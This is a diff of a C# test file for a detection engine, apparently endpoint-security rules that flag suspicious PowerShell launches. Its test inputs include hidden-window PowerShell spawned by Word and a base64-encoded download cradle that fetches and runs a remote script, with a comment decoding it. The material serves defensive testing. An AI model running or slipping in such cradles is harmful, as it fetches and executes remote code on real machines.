@@ -45,14 +45,15 @@ internal static class RuleTest
             P("powershell.exe", "winword.exe", cmd: Sys + "powershell.exe -w hidden"),
             Expect.Alert, "lolbin.office-parent"),
 
-        new("Encoded PowerShell command",
+        // Base64 of: IEX (New-Object Net.WebClient).DownloadString('http://x.io/a.ps1')
+        new("Encoded command hiding a download cradle",
             P("powershell.exe", "explorer.exe",
-              cmd: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="),
-            Expect.Alert, "lolbin.command-line"),
+              cmd: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AeAAuAGkAbwAvAGEALgBwAHMAMQAnACkA"),
+            Expect.Alert, "lolbin.encoded-payload"),
 
-        new("Encoded via a -e prefix",
+        new("Encoded command that will not decode",
             P("powershell.exe", "explorer.exe",
-              cmd: "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="),
+              cmd: "powershell.exe -enc AAAAAAAAAAAAAAAAAAAAA"),
             Expect.Alert, "lolbin.command-line"),
 
         new("Download cradle (IEX + WebClient)",
@@ -103,6 +104,14 @@ internal static class RuleTest
             Expect.Alert, "script.user-path"),
 
         // ---------- worth logging, never worth a pop-up ----------
+        // Base64 of: Get-ChildItem "C:\src" | Select-Object Name
+        // Honest tooling encodes its commands to escape quoting rules; only the decoded
+        // text can separate that from an attack, so the engine decodes before it judges.
+        new("Encoded command whose payload is ordinary",
+            P("powershell.exe", "node.exe",
+              cmd: "powershell.exe -NoProfile -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgACIAQwA6AFwAcwByAGMAIgAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAATgBhAG0AZQA="),
+            Expect.Quiet, "lolbin.command-line"),
+
         new("Invoke-WebRequest downloading an installer to disk",
             P("powershell.exe", "explorer.exe",
               cmd: "powershell -Command \"Invoke-WebRequest -Uri https://x.io/setup.msi -OutFile setup.msi\""),
